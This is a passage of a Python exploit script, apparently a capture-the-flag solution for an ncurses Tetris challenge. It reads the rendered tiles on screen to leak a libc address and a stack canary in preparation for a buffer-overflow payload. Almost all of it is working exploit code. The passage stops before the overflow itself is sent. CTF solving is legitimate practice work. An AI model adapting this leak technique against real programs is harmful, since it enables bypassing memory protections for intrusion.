screen = pyte.Screen(100, 500)
stream = pyte.ByteStream(screen)
prev_difficulty = 0
curr_idx = 1
need_to_check_leak = -1
found_reward = False
stop_move = False
rand_val = 10

# Will be used to store the leaked bytes.
leaked_map = {}
for i in range(6):
    leaked_map[i] = [0] * 8
leaked_map[0][5] = 0x7f
leaked_map[0][0] = 0x60 # Libc system always end with 60 and start with 7f. Need this to speed up the leakage process

# Parse ncurse payload
while True:
    b = r.recv(2048)
    stream.feed(b)

    # Cleaned scr will parse the received bytes so that it only print the map
    cleaned_scr = []
    for disp in screen.display[5:35]:
        cleaned_scr.append(disp[5:57])

    # Print leaked bytes on each iteration
    print(f'rand_val: {rand_val}')
    for key, val in leaked_map.items():
        print(f'leaked_map[{key}]: {hex(u64(bytes(val)))}')

    print(f'-'+'000102030405060708091011121314'+f'-')
    for row in cleaned_scr:
        if 'Reward' in row:
            # Exit the loop, so that we can send our BOF payload
            found_reward = True
            print(f'Found reward')
        print(row)
    print(f'-'+'000102030405060708091011121314'+f'-')
    if found_reward:
        break
    
    # Collect difficulty and score
    try:
        curr_difficulty = int(cleaned_scr[20].split(' Difficulty: ')[1])
        curr_score = int(cleaned_scr[22].split(' Score: ')[1])
    except:
        continue

    # We don't want to move manually again. That means we've fully recovered the
    # leak, and want to end the game so that we can get the Reward screen
    if stop_move:
        continue
    
    # Try to parse tiles, and collect leaked bytes of libc address and canary
    if prev_difficulty != curr_difficulty:
        # There is a new tile, Parse it later after the screen buffer is fulfilled
        need_to_check_leak = 5
        rand_val = curr_difficulty - 10*curr_idx
        prev_difficulty = curr_difficulty
        curr_idx += 1
    elif need_to_check_leak > 0:
        # Buffer the screen, so that the full tiles are rendered
        need_to_check_leak -= 1
    elif need_to_check_leak == 0:
        # Time to parse
        first_leaked_row = -1
        last_leaked_row = -1
        for row_i, row in enumerate(cleaned_scr):
            if '                              ' not in row and first_leaked_row == -1:
                first_leaked_row = row_i
            elif '                              ' in row and first_leaked_row != -1:
                last_leaked_row = row_i - 1
                break

        # Dirty code, but basically this whole if conditional logic is trying
        # to parse the tiles and store the leaked bytes to our leaked_map
        if last_leaked_row != -1 and first_leaked_row != -1:
            # Parse tiles
            for i in range(last_leaked_row, first_leaked_row-1, -1):
                if last_leaked_row - first_leaked_row == 1:
                    if ' ' not in cleaned_scr[i][13:17] and ' ' not in cleaned_scr[i-1][13:17]:
                        for ii in range(last_leaked_row, first_leaked_row-1, -1):
                            for j in range(13, 19, 2):
                                # print(((last_leaked_row-ii+1)*3) + ((j-13)//2))
                                if ((last_leaked_row-ii+1)*3) + ((j-13)//2) == 8:
                                    break
                                if cleaned_scr[ii][j:j+2] != '  ':
                                    leaked_map[rand_val][((last_leaked_row-ii+1)*3) + ((j-13)//2)] = int(cleaned_scr[ii][j:j+2], 16) ^ 0x41
                        break
                if last_leaked_row == first_leaked_row:
                    for j in range(11, 19, 2):
                        if 2 + ((j-11)//2) == 8:
                            break
                        if cleaned_scr[i][j:j+2] != '  ':
                            leaked_map[rand_val][2 + ((j-11)//2)] = int(cleaned_scr[i][j:j+2], 16) ^ 0x41
                    break
                for j in range(13, 19, 2):
                    if ((last_leaked_row-i)*3) + ((j-13)//2) == 8:
                        break
                    if cleaned_scr[i][j:j+2] != '  ':
                        leaked_map[rand_val][((last_leaked_row-i)*3) + ((j-13)//2)] = int(cleaned_scr[i][j:j+2], 16) ^ 0x41
        
        # Input your move manual, so that we can parse while playing the tetris
        # to cleat at least 1 line.
        need_to_check_leak = -1
        if not stop_move:
            moves = input('Your move: ')
            if moves == 'stop':
                stop_move = True
            else:
                for move in moves:
                    r.sendline(move.encode())
                r.sendline(b' ')
